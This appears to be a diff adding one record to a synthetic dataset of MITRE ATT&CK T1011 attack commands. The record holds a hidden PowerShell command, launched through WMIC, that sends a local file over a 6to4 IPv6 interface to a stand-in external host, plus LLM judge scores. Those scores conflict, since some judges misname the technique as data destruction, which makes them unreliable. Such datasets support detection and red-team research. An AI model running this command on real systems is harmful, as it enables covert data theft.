@@ -1,0 +1,59 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "wmic process call create \"powershell -NoProfile -WindowStyle Hidden -Command `$ifc=Get-WmiObject Win32_NetworkAdapterConfiguration | ?{ `$_.IPEnabled -and (`$_.Description -like '*6to4*') }; if(`$ifc){ `$ip6=@(`$ifc.IPAddress | ?{ `$_ -like '*:*' })[0]; if(`$ip6){ `$c=New-Object Net.Sockets.TcpClient([Net.Sockets.AddressFamily]::InterNetworkV6); `$c.Client.Bind((New-Object Net.IPEndPoint ([Net.IPAddress]::Parse(`$ip6),0))); `$rv6=[Net.IPAddress]::Parse('2001:db8:2::44'); `$c.Connect(`$rv6,60023); `$s=`$c.GetStream(); `$b=[IO.File]::ReadAllBytes('C:\\Users\\Public\\Pictures\\thumbcache.tmp'); `$s.Write(`$b,0,`$b.Length); `$s.Close(); `$c.Close() } }\"",
+  "explanation": "Executes PowerShell through WMIC to bind to a 6to4 IPv6 interface and exfiltrate a file over IPv6 using a high TCP port. This leverages an alternate IPv6 transition medium in accordance with T1011.",
+  "rationale_steps": [
+    "Locate the 6to4 adapter and extract an IPv6 address.",
+    "Bind an IPv6 TCP client to the selected interface.",
+    "Connect to an IPv6 external host on an uncommon port.",
+    "Transfer data over the 6to4 path instead of the primary network.",
+    "Keep changes confined to the exfiltration process."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-987933e0-c70ba636",
+  "source_prompt_hash": "987933e0",
+  "timestamp_utc": "2025-09-30T08:13:32.291694Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with properly balanced quotes, backticks, parentheses, and braces, correct PowerShell syntax including variable declarations, pipeline operations, and method calls.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1011 (Exfiltration Over Other Network Medium) by identifying a 6to4 IPv6 interface, binding to it, and exfiltrating a file over IPv6 to a remote server using a high TCP port.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T02:12:04.388187Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, including correct WMIC invocation, proper PowerShell command string escaping, and valid PowerShell syntax throughout.",
+        "semantic_score": 1,
+        "semantic_justification": "The command performs file exfiltration, which is semantically misaligned with the T1011 Data Destruction technique described.",
+        "combined_score": 3.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T02:12:22.624926Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 3,
+        "syntactic_justification": "Quoting and separators are balanced and WMIC syntax is correct, but pervasive backticks before PowerShell variables (e.g., `$ifc, `$_) are unnecessary and may cause parsing issues.",
+        "semantic_score": 1,
+        "semantic_justification": "The command exfiltrates a file over IPv6 via a 6to4 interface rather than performing data destruction as described for the technique.",
+        "combined_score": 2.0,
+        "confidence": 0.6,
+        "timestamp": "2025-10-02T02:13:40.078342Z"
+      }
+    ],
+    "llm_average_syntactic": 4.333,
+    "llm_average_semantic": 2.333,
+    "llm_average_score": 3.333,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
